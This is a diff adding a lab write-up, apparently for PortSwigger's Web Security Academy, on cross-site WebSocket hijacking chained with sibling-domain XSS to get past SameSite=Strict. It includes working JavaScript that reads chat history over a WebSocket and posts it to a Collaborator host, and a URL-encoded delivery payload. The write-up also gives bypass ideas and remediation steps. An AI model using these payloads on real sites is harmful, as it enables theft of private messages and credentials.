@@ -3750,3 +3750,517 @@ Redirect inside → cookies enabled
 ---
 
 Use on-site redirect + path traversal to convert cross-site request into same-site → cookies included → CSRF succeeds
+
+---
+
+# 🐞 Lab-9 — CSWSH → SameSite=Strict Bypass via Sibling Domain XSS
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates an advanced **Cross-Site WebSocket Hijacking (CSWSH)** attack combined with:
+
+✔ SameSite=Strict cookie restriction  
+✔ Sibling domain XSS  
+✔ WebSocket data exfiltration  
+
+---
+
+👉 Goal:
+
+```
+Steal chat history → extract credentials → takeover account
+```
+
+---
+
+## 🧠 Core Idea
+
+SameSite blocks cross-site cookies  
+Sibling domain XSS makes request same-site  
+
+---
+
+## 🧠 Key Exploit
+
+```
+XSS → open WebSocket → send READY → receive chat → exfiltrate
+```
+
+---
+
+## 🔍 What Is This Topic?
+
+### 🔹 CSWSH (Cross-Site WebSocket Hijacking)
+
+Abusing WebSocket connections to perform actions or steal data using victim’s session
+
+---
+
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Analyze Live Chat
+
+```
+Open Live Chat → send messages
+```
+
+---
+
+Captured request:
+
+```
+GET /chat
+```
+
+---
+
+### 🧠 Observation
+
+```
+WebSocket handshake request
+```
+
+---
+
+### 🧩 Step 2 — Inspect WebSocket Behavior
+
+```
+Client → sends READY
+Server → returns full chat history
+```
+
+---
+
+### 🧠 Key Insight
+
+```
+READY triggers full data dump
+```
+
+---
+
+### 🧩 Step 3 — Build CSWSH PoC
+
+```
+<script>
+var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+
+ws.onopen = function() {
+    ws.send("READY");
+};
+
+ws.onmessage = function(event) {
+    fetch('https://YOUR-COLLABORATOR.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: event.data
+    });
+};
+</script>
+```
+
+---
+
+### 🧩 Step 4 — Test Exploit
+
+```
+Victim loads page
+```
+
+---
+
+👉 Result:
+
+✔ WebSocket connects  
+✔ READY sent  
+✔ Chat received  
+✔ Data exfiltrated  
+
+---
+
+### 🧩 Step 5 — Identify Problem
+
+```
+Session cookie not included
+```
+
+---
+
+### 🧠 Reason
+
+```
+SameSite=Strict
+→ blocks cross-site WebSocket authentication
+```
+
+---
+
+### 🧩 Step 6 — Find Additional Attack Surface
+
+```
+Access-Control-Allow-Origin header reveals:
+
+cms-YOUR-LAB-ID.web-security-academy.net
+```
+
+---
+
+### 🧠 Insight
+
+```
+Sibling domain discovered
+```
+
+---
+
+### 🧩 Step 7 — Test CMS Domain
+
+```
+Visit CMS login page
+```
+
+---
+
+### 🧠 Observation
+
+```
+Username reflected in response
+```
+
+---
+
+### 🧩 Step 8 — Test XSS
+
+```
+<script>alert(1)</script>
+```
+
+---
+
+👉 Result:
+
+✔ XSS confirmed  
+
+---
+
+### 🧩 Step 9 — Critical Discovery
+
+```
+CMS + main site share same site (eTLD+1)
+```
+
+---
+
+### 🧠 Impact
+
+```
+SameSite cookies WILL be included
+```
+
+---
+
+### 🧩 Step 10 — Confirm via GET
+
+```
+/login?username=<script>alert(1)</script>
+```
+
+---
+
+👉 Result:
+
+✔ XSS works via URL  
+
+---
+
+### 🧩 Step 11 — Combine Attack
+
+Chain:
+
+```
+XSS + WebSocket + SameSite bypass
+```
+
+---
+
+### 🧩 Step 12 — Final Payload
+
+```
+<script>
+document.location =
+"https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=%3Cscript%3Evar%20ws%20%3D%20new%20WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');ws.onopen%20%3D%20function()%7Bws.send('READY');%7D;ws.onmessage%20%3D%20function(e)%7Bfetch('https://YOUR-COLLABORATOR.oastify.com'%2C%7Bmethod%3A'POST'%2Cmode%3A'no-cors'%2Cbody%3Ae.data%7D)%3B%7D%3B%3C/script%3E&password=x";
+</script>
+```
+
+---
+
+### 🧩 Step 13 — Deliver Exploit
+
+```
+Victim clicks link → exploit runs
+```
+
+---
+
+### 🧩 Step 14 — Result
+
+✔ WebSocket authenticated  
+✔ Chat history leaked  
+✔ Credentials exposed  
+
+---
+
+## 💣 Payload Breakdown
+
+---
+
+### 🔹 WebSocket
+
+```
+new WebSocket(...)
+```
+
+---
+
+✔ Opens authenticated connection  
+
+---
+
+### 🔹 READY Trigger
+
+```
+ws.send("READY")
+```
+
+---
+
+✔ Requests full chat history  
+
+---
+
+### 🔹 Exfiltration
+
+```
+fetch(..., { body: event.data })
+```
+
+---
+
+✔ Sends data to attacker  
+
+---
+
+### 🔹 XSS Injection
+
+```
+<script>...</script>
+```
+
+---
+
+✔ Executes inside trusted domain  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Chat Applications
+
+```
+Steal messages + credentials
+```
+
+---
+
+### 🔥 Scenario 2 — Trading Platforms
+
+```
+Intercept real-time data
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Dashboards
+
+```
+Access internal WebSocket feeds
+```
+
+---
+
+### 🔥 Scenario 4 — SaaS Tools
+
+```
+Extract API keys / tokens
+```
+
+---
+
+### 🔥 Scenario 5 — Collaboration Apps
+
+```
+Leak private conversations
+```
+
+---
+
+## ⚔️ Attack Chain
+
+---
+
+1️⃣ Identify WebSocket endpoint  
+2️⃣ Observe READY behavior  
+3️⃣ Build CSWSH PoC  
+4️⃣ SameSite blocks cookies  
+5️⃣ Discover sibling domain  
+6️⃣ Find XSS  
+7️⃣ Execute inside same-site  
+8️⃣ Open WebSocket  
+9️⃣ Send READY  
+🔟 Exfiltrate data  
+
+---
+
+## 🎯 High-Value Targets
+
+---
+
+```
+/chat
+/ws
+/socket
+/notifications
+/live-feed
+```
+
+---
+
+## ⚠️ Real-World Limitations + Bypass
+
+---
+
+### ❌ No XSS
+
+👉 Attack fails  
+
+---
+
+### ❌ Strict Origin Check
+
+👉 WebSocket blocked  
+
+---
+
+### ❌ Token-based WS Auth
+
+👉 Cannot hijack  
+
+---
+
+### ❌ Isolated Domains
+
+👉 SameSite bypass not possible  
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Find subdomain XSS
+Chain with CORS misconfig
+Combine with open redirect
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+### 🔴 Root Problem
+
+WebSocket trusts cookies without validation  
+
+---
+
+### ✅ Fix 1 — Validate Origin
+
+```
+Check WebSocket Origin header
+```
+
+---
+
+### ✅ Fix 2 — Use Auth Tokens
+
+```
+Do not rely only on cookies
+```
+
+---
+
+### ✅ Fix 3 — Fix XSS
+
+```
+Sanitize all inputs
+```
+
+---
+
+### ✅ Fix 4 — Restrict Cross-Domain
+
+```
+Isolate sensitive domains
+```
+
+---
+
+### ✅ Fix 5 — Add CSRF-like Protection
+
+```
+Token-based WebSocket auth
+```
+
+---
+
+## 🧠 Mental Model
+
+---
+
+XSS executes inside trusted site  
+
+→ WebSocket opens  
+
+→ READY sent  
+
+→ Data returned  
+
+→ Data stolen  
+
+---
+
+## 🎯 Final Summary
+
+---
+
+✔ SameSite=Strict bypassed via sibling domain  
+
+✔ XSS enables same-site execution  
+
+✔ WebSocket leaks sensitive data  
+
+✔ Full account compromise achieved  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Use sibling-domain XSS to turn cross-site into same-site → hijack WebSocket → steal data
